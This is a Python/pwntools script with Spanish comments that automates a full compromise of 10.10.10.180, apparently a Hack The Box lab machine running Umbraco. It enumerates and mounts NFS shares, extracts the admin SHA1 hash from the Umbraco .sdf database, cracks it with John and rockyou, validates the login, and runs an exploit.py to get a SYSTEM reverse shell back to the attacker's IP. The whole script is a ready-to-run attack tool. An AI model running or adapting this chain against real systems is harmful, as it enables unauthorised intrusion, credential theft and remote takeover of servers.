from pwn import *
from pathlib import Path
import time, sys, requests, json, os, subprocess, signal

# Configuracion
target = "10.10.10.180"
ip_local = "10.10.16.7"
wordlist = "/usr/share/wordlists/rockyou.txt"

# Ctrl + C
def def_handler(sig, frame):
    log.error("Saliendo del programa")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


# Enumeramos el puerto 2049 para detectar directorios accesibles.
def enumNFS():
    print()
    try:
        log.info("Enumerando carpetas en el puerto NFS")
        time.sleep(1)
        r = subprocess.run(f"showmount -e {target} | tail -n +2 | awk '{{print $1}}' &>/dev/null", shell=True, text=True, capture_output=True, check=True)
        directorio = r.stdout.strip()
        
        if not directorio:
            raise RuntimeError("No se encontraron carpetas")
        else:
            log.success(f"Carpeta encontrada: {directorio}")
            return directorio
    
    except Exception as e:
        log.error(f"Error inesperado: {e}")
    

# Creamos una montura del directorio encontrado en /mnt/nfs.
def createMount(directorio):
    
    try:
        time.sleep(1)
        log.info(f"Creando una montura de {directorio} en /mnt/nfs")
        
        # Si existe la carpeta sigue el flujo sin errores, pero si no existe la crea.
        Path("/mnt/nfs").mkdir(parents=True, exist_ok=True)
        
        subprocess.run(f"sudo mount -t nfs {target}:{directorio} /mnt/nfs", shell=True, text=True, check=True)
        
        # Comprueba que se haya creado la montura.
        time.sleep(1)
        check = subprocess.run(f"mountpoint -q /mnt/nfs", shell=True, text=True)
        
        if check.returncode == 0:
            log.success("La montura se creo correctamente")
        else:
            raise RuntimeError("No se pudo crear la montura")
    
    except subprocess.CalledProcessError as e:
        log.error(f"Error al ejecutar {e.cmd}")
    
    except Exception as e:
        log.error(f"Error inesperado: {e}")


# Buscamos y extraemos la base de datos de Umbraco.
def extractSDF():

    try:
        time.sleep(1)
        log.info("Buscando archivos .sdf en la montura")
        time.sleep(1)
        r1 = subprocess.run(f"find /mnt/nfs/App_Data/ -maxdepth 1 -type f -name '*.sdf'", shell=True, text=True, check=True, capture_output=True)
        sdf = r1.stdout.strip()
        log.success(f"Base de datos encontrada: {sdf}")
        
    except Exception as e:
        log.error(f"No se encontro la base de datos {e}")
        raise
        
    try:
        # Extraemos el usuario
        time.sleep(1)
        log.info("Buscando credenciales en la base de datos")
        r1 = subprocess.run(f"strings '{sdf}' | grep -oP 'admin\\K.*(?=[a-f0-9]{{40}})' | tail -n 1", shell=True, text=True, check=True, capture_output=True)
        user = r1.stdout.strip()
        
        time.sleep(1)
        
        # Extraemos el hash
        r2 = subprocess.run(f"strings '{sdf}' | grep -oP '[a-f0-9]{{40}}' | tail -n 1", shell=True, text=True, check=True, capture_output=True)
        hash = r2.stdout.strip()
        
        # Comprobamos que user y hash tengan contenido
        if not user or not hash:
            raise ValueError("No se pudo extraer las credenciales")
        else:
            log.success("Credenciales extraidas")
            
        log.success(f"Hash SHA1 encontrado: {hash}")
        
        with open("hash.txt", "w") as f:
            f.write(hash)
        
    except Exception as e:
        log.error(f"Error inesperado: {e}")
        raise
    
    # Creackeamos con John
    try:
        time.sleep(1)
        log.info("Crackeando hash con John")
        
        # Crackeamos el hash SHA1
        subprocess.run(f"john -w={wordlist} hash.txt", shell=True, text=True, check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        p = subprocess.run("john --show hash.txt | awk -F: '{print $2}'", shell=True, text=True, check=True, capture_output=True)
        password = p.stdout.strip()
        
        time.sleep(1)
        log.success(f"Usuario: {user}")
        log.success(f"Contraseña: {password}")
        
        Path("./hash.txt").unlink()
        
        return user, password
    
    except subprocess.CalledProcessError as e:
        log.error(f"Error al ejecutar {e.cmd}")
    
    except Exception as e:
        log.error(f"Error inesperado: {e}")


# Nos logeamos en umbraco para comprobar las credenciales
def loginUmbraco(user, password):
    url = f"http://{target}/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
    
    try:
        time.sleep(1)
        log.info("Verificando credenciales con el panel de login")
        time.sleep(1)
        
        s = requests.session()
        
        r = s.get(f"http://{target}/umbraco")
        if r.status_code == 200:
            log.success("Conexion exitosa")
        else:
            log.error("Conexion fallida")
        
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json;charset=UTF-8",
            "Referer": f"http://{target}/umbraco"
        }
        
        post_data = {
            "username": f"{user}",
            "password": f"{password}"
        }
        
        time.sleep(1)
        r = s.post(url, json=post_data, headers=headers, timeout=10)
        
        if r.status_code == 200 and "allowedSections" in r.text:
            log.success("Credenciales validas")
        else:
            log.error(f"Error en login, estado {r.status_code}")
            raise RuntimeError("Error al logearnos")

    except Exception as e:
        log.error(f"Error inesperado: {e}")
        raise


# Ejecutamos el archivo exploit.py para enviar el exploit y obtener una reverseshell como SYSTEM
def exploit(user, password):
    time.sleep(1)
    print("\n----- EXPLOTACION -----\n")

    try:
        log.info("Instalando requerimientos del exploit")
        subprocess.run("python3 -m venv venv", shell=True, text=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run("./venv/bin/pip install -r requirements.txt", shell=True, text=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run("./venv/bin/pip install requests beautifulsoup4 pwntools pycryptodome", shell=True, text=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        log.info("Lanzando exploit para realizar RCE")
        subprocess.run(f"./venv/bin/python3 exploit.py -u {user} -p {password} -w 'http://{target}/' -i {ip_local}", shell=True, text=True, check=True)
        
    except subprocess.CalledProcessError as e:
        log.error(f"Error al ejecutar: {e.cmd}")
        raise
    
    except Exception as e:
        log.error(f"Error inesperado: {e}")
        raise


if __name__ == '__main__':
    
    try:
        directorio = enumNFS()
        createMount(directorio)
        user, password = extractSDF()
        loginUmbraco(user, password)
        exploit(user, password)
        
    except Exception as e:
        log.error(f"Error inesperado: {e}")
        sys.exit(1)